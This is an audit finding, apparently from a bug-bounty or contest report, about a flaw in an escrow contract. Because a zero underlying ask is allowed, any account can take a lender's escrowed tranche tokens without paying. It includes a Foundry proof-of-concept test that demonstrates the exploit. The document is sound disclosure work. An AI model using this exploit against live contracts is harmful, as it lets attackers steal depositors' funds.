### Title
Fulfiller can seize escrowed tranche tokens for zero underlying payment - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol])

### Summary
`createWriteOffRequest` rejects a zero `amount` of tranche tokens but performs no validation on `underlyingsRequested`, so a lender's escrow entry can carry an ask of `0`. `fullfillWriteOffRequest` then only enforces `_underlyings < currentRequest.underlyings → revert`, which passes trivially when the ask is 0, letting any EOA pull all escrowed tranche tokens out while transferring nothing.

### Finding Description
- `createWriteOffRequest` only guards `amount == 0`; `underlyingsRequested` may be 0 and is accumulated into `userRequests[msg.sender].underlyings` and `pendingUnderlyings` (lines 86-102).
- In `fullfillWriteOffRequest`, the payment check is `if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) revert WrongRequest();` (line 129). With `underlyings == 0`, passing `_underlyings = 0` satisfies the check.
- The fulfiller then executes `safeTransferFrom(msg.sender, this, 0)` (a no-op on standard ERC20s), pays a 0 exit fee, sends the lender `_underlyings - _totFee = 0`, and receives the full `currentRequest.tranches` balance (lines 139-151).
- The request is created during a running epoch when tranche tokens represent a live claim on vault NAV, so the seized tokens are directly redeemable for underlying via the normal withdraw-request/claim flow or `writeOffDeposit` if the fulfiller is the borrower.

### Impact Explanation
Permanent theft of the lender's escrowed tranche tokens. The lender receives 0 underlying and loses their entire escrowed position; the attacker (any unprivileged EOA) gains tranche tokens redeemable for vault assets. Loss is quantified as the full escrowed `tranches` amount times the current tranche virtual price.

### Likelihood Explanation
Requires a lender to submit `underlyingsRequested = 0` — plausible as a misconfiguration (e.g., intent to re-list later, or a frontend default), and `createWriteOffRequest` accrues requests so a single zero-ask entry taints the aggregate request. Once present, fulfillment is permissionless (`@dev this function can be called by any wallet`), needs no capital, and is front-runnable by any observer. No existing guard (`Is0`, `WrongRequest`, epoch gating, nonReentrant) prevents it.

### Recommendation
Reject `underlyingsRequested == 0` in `createWriteOffRequest` (mirror the `amount == 0` check), and/or require `_underlyings > 0` in `fullfillWriteOffRequest` so escrowed tranches can never be released for a zero payment.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract ZeroPaymentEscrowTest is Test {
    // fork mainnet at a block where the target vault epoch is running
    IdleCreditVaultWriteOffEscrow escrow = IdleCreditVaultWriteOffEscrow(ESCROW);
    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(escrow.idleCDOEpoch());
    IERC20Detailed tranche = IERC20Detailed(escrow.tranche());
    IERC20Detailed underlying = IERC20Detailed(escrow.underlying());

    function testZeroPaymentFulfill() external {
        address lender = makeAddr("lender"); // KYC-passing lender
        address attacker = makeAddr("attacker");

        // lender holds tranche tokens (acquired via depositAA/BB in buffer phase)
        uint256 trancheAmt = 1_000e18;
        deal(address(tranche), lender, trancheAmt);

        // epoch must be running
        assertTrue(cdo.isEpochRunning());

        // lender creates a write-off request mistakenly asking 0 underlyings
        vm.startPrank(lender);
        tranche.approve(address(escrow), trancheAmt);
        escrow.createWriteOffRequest(trancheAmt, 0);
        vm.stopPrank();

        // any EOA fulfills with zero payment
        vm.prank(attacker);
        escrow.fullfillWriteOffRequest(lender, trancheAmt, 0);

        // attacker got all tranche tokens, paid nothing, lender got nothing
        assertEq(tranche.balanceOf(attacker), trancheAmt);
        assertEq(underlying.balanceOf(lender), 0);
        assertEq(underlying.balanceOf(attacker), 0);
    }
}
```
